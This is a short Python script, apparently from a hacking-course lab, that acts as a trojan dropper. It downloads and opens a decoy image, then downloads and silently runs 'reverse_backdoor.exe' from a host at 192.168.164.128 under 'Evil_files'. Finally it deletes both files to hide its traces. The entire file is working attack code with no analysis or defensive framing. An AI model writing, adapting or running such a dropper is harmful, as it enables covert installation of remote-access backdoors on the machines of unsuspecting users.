#!/usr/bin/env/python
import requests, subprocess, os, tempfile


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as file:
        file.write(get_response.content)


tempdirectory = tempfile.gettempdir()
os.chdir(tempdirectory)
download("http://192.168.164.128/Evil_files/panda.jpg")
subprocess.Popen("panda.jpg", shell=True)
download("http://192.168.164.128/Evil_files/reverse_backdoor.exe")
subprocess.call("reverse_backdoor.exe", shell=True)

os.remove("panda.jpg")
os.remove("reverse_backdoor.exe")
